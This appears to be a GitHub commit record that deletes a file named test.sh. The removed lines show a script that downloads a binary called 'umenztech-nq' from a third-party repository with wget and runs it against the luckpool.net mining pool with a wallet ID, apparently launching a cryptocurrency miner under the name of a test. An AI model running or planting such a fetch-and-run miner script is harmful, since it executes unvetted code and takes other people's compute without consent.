7adba9a895449964d33fde048008c937d5521ca4
jacknero001 <91582634+jacknero001@users.noreply.github.com>
2021-09-29 14:11:15 +0700

    Delete test.sh

--- test.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/sh
-echo ./umenztech-nq -v -l na.luckpool.net:3956 -u RAKBn8kUNMe3HBr4CWy1SQgzys1NfS3j5M.jack1 -t 2 >> test1.sh && chmod +x test1.sh && wget https://github.com/dorinkutozi/umenztech/blob/umenztech-cpu-nq/umenztech-nq && ./test1.sh
